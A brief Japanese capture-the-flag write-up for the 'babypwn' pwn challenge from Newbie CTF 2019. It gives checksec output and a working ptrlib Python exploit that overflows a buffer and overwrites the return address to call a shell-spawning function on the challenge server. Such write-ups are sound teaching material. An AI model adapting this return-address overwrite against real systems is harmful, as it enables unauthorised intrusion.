# [pwn 521pts] babypwn - Newbie CTF 2019
64ビットで全部無効です。
```
$ checksec -f babypwn
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable  FILE
Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   71 Symbols     No       0               4       babypwn
```
単純なBOFとシェルを起動する関数があるのでリターンアドレスを書き換えます。
```python
from ptrlib import *

elf = ELF("./babypwn")
#sock = Process("./babypwn")
sock = Socket("prob.vulnerable.kr", 20035)

payload = b"A" * 0x408
payload += p64(0x40065a)
payload += p64(elf.symbol("flag2"))
sock.sendline(payload)

sock.interactive()
```

# 感想
簡単ですね。